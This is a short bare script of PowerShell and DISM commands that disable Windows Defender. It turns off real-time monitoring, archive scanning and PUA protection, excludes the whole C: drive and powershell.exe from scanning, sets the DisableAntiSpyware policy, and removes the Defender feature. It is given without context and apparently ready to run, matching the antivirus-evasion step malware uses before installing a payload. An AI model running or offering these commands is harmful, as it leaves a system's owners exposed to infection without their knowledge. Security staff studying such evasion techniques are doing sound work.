Set-MpPreference -DisableArchiveScanning $True

Add-MpPreference -ExclusionPath C:\*

Set-MpPreference -ExclusionProcess "powershell.exe"

Set-MpPreference -PUAProtection 0

Set-MpPreference -DisableRealtimeMonitoring $true

New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
